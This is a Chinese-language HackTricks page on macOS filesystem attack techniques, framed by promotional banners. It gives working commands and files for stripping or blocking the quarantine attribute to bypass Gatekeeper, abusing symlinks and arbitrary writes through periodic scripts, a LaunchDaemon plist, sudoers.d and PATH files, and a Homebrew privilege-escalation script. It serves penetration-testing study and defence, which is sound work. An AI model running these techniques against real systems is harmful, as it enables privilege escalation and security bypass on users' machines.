# macOS FS 技巧

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS 红队专家）</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想看到您的**公司在 HackTricks 中做广告**或**下载 PDF 版的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFT**](https://opensea.io/collection/the-peass-family)收藏
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** 上关注**我们。
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## POSIX 权限组合

**目录**中的权限：

* **读取** - 您可以**枚举**目录条目
* **写入** - 您可以在目录中**删除/写入**文件，还可以**删除空文件夹**。
* 但是，除非您拥有写入权限，否则**无法删除/修改非空文件夹**。
* 除非您拥有它，否则**无法修改文件夹的名称**。
* **执行** - 您被**允许遍历**目录 - 如果您没有此权限，您无法访问其中的任何文件，或任何子目录中的文件。

### 危险组合

**如何覆盖 root 拥有的文件/文件夹**，但：

* 路径中的一个父**目录所有者**是用户
* 路径中的一个父**目录所有者**是具有**写入访问权限**的**用户组**
* 一个用户**组**对**文件**具有**写入**访问权限

使用上述任何组合，攻击者可以**注入**一个**符号链接/硬链接**到预期路径，以获取特权任意写入。

### 文件夹根目录 R+X 特殊情况

如果有文件在**目录**中，其中**只有 root 具有 R+X 访问权限**，那些文件对其他人**不可访问**。因此，允许**移动用户可读的文件**的漏洞，由于该**限制**而无法读取，从该文件夹**移动到另一个文件夹**，可能被滥用以读取这些文件。

示例：[https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## 符号链接 / 硬链接

如果一个特权进程正在写入**文件**，该文件可能被**低权限用户控制**，或者可能是**之前由低权限用户创建**。用户可以通过符号链接或硬链接**将其指向另一个文件**，特权进程将写入该文件。

请查看其他部分，攻击者可以**滥用任意写入以提升权限**。

## .fileloc

具有**`.fileloc`**扩展名的文件可以指向其他应用程序或二进制文件，因此当打开它们时，将执行该应用程序/二进制文件。\
示例：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## 任意FD

如果你可以让一个**进程以高权限打开一个文件或文件夹**，你可以滥用**`crontab`**来打开`/etc/sudoers.d`中的一个文件，使用**`EDITOR=exploit.py`**，这样`exploit.py`将获得`/etc/sudoers`中文件的FD并滥用它。

例如：[https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## 避免quarantine xattrs技巧

### 删除它
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable标志

如果文件/文件夹具有此不可变属性，则无法在其上放置xattr
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs 挂载

**devfs** 挂载**不支持 xattr**，更多信息请参考 [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

此ACL防止向文件添加`xattrs`。
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble**文件格式会复制文件及其ACEs。

在[**源代码**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)中，可以看到存储在名为**`com.apple.acl.text`**的xattr中的ACL文本表示将被设置为解压后文件中的ACL。因此，如果您将一个应用程序压缩成一个使用ACL阻止其他xattr写入的**AppleDouble**文件格式的zip文件... 那么隔离xattr就不会设置到应用程序中：

查看[**原始报告**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)以获取更多信息。

要复制这一过程，首先需要获取正确的acl字符串：
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

不是必需的，但我还是留在这里以防万一：

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## 绕过代码签名

Bundle 包含文件 **`_CodeSignature/CodeResources`**，其中包含 **bundle** 中每个 **文件** 的 **哈希**。请注意，CodeResources 的哈希也嵌入在可执行文件中，因此我们不能对其进行更改。

然而，有一些文件的签名不会被检查，这些文件在 plist 中具有省略键，如：
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
可以使用以下命令行计算资源的签名：

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## 挂载dmgs

用户甚至可以将自定义dmg挂载到一些现有文件夹上。以下是如何创建带有自定义内容的自定义dmg包的方法：

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

## 任意写入

### 周期性 sh 脚本

如果您的脚本可以被解释为一个**shell脚本**，您可以覆盖**`/etc/periodic/daily/999.local`** shell脚本，该脚本将每天触发一次。

您可以使用以下命令**伪造**执行此脚本：**`sudo periodic daily`**

### 守护进程

编写一个任意的**LaunchDaemon**，比如**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**，其中包含执行任意脚本的 plist 文件：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
### 生成脚本 `/Applications/Scripts/privesc.sh`，其中包含您希望以 root 权限运行的**命令**。

### Sudoers 文件

如果您拥有**任意写入权限**，您可以在**`/etc/sudoers.d/`**文件夹中创建一个文件，授予自己**sudo**权限。

### PATH 文件

文件**`/etc/paths`**是填充 PATH 环境变量的主要位置之一。您必须是 root 才能覆盖它，但如果**特权进程**的脚本执行一些**没有完整路径的命令**，您可能可以通过修改此文件来**劫持**它。

您还可以在**`/etc/paths.d`**中编写文件，以将新文件夹加载到 `PATH` 环境变量中。

## 生成其他用户可写文件

这将生成一个属于 root 的文件，我可以对其进行写入操作（[**代码在此处**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)）。这也可能作为权限提升操作：
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## 参考资料

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
